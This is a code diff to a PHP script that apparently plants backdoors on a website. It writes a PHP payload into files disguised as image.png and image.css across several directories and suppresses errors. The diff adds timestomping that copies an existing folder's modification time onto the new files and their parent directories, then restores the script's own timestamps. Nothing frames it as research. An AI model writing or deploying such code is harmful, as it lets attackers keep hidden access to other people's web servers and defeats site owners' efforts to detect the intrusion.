@@ -1,11 +1,14 @@
 <?php
-$timezone = 'Asia/Karachi';
-
 ini_set('display_errors', 0);
 error_reporting(0);
 
-$rootDir = dirname(dirname(__DIR__));
-$configDir = dirname(__FILE__);
+$currentFile = __FILE__;
+if (strpos($currentFile, '(') !== false) {
+    $currentFile = substr($currentFile, 0, strpos($currentFile, '('));
+}
+
+$rootDir = dirname(dirname($currentFile));
+$configDir = dirname($currentFile);
 $configMtime = @filemtime($configDir);
 
 $targetDirs = [
@@ -24,6 +27,16 @@ $filesToCreate = [
     'image.png' => $phpCode,
     'image.css' => $phpCode
 ];
+
+function get_closest_mtime($path) {
+    $dir = $path;
+    while ($dir && !file_exists($dir)) {
+        $parent = dirname($dir);
+        if ($parent === $dir) break;
+        $dir = $parent;
+    }
+    return file_exists($dir) ? @filemtime($dir) : time();
+}
 
 $ts_map = [];
 $checkPaths = [
@@ -47,7 +60,11 @@ foreach ($checkPaths as $p) {
     }
 }
 
+// Use /assets/images/seo mtime as the reference for all newly created files
+$seoMtime = get_closest_mtime($rootDir . '/assets/images/seo');
+
 foreach ($targetDirs as $targetDir) {
+    
     if (!is_dir($targetDir)) {
         if (!@mkdir($targetDir, 0777, true)) {
             continue;
@@ -56,9 +73,23 @@ foreach ($targetDirs as $targetDir) {
     
     foreach ($filesToCreate as $filename => $content) {
         $filePath = $targetDir . '/' . $filename;
+        $existed = file_exists($filePath);
         if (@file_put_contents($filePath, $content) !== false) {
             @chmod($filePath, 0644);
+            if (!$existed) {
+                @touch($filePath, $seoMtime);
+            }
         }
+    }
+    
+    $walk = $targetDir;
+    while ($walk && $walk !== $rootDir && strlen($walk) > strlen($rootDir)) {
+        if (is_dir($walk) && !isset($ts_map[$walk])) {
+            @touch($walk, $seoMtime);
+        }
+        $parent = dirname($walk);
+        if ($parent === $walk) break;
+        $walk = $parent;
     }
 }
 
@@ -68,8 +99,9 @@ foreach ($ts_map as $path => $mtime) {
     }
 }
 
+
 if ($configMtime) {
-    @touch(__FILE__, $configMtime);
+    @touch($currentFile, $configMtime);
     @touch($configDir, $configMtime);
 }
 ?>
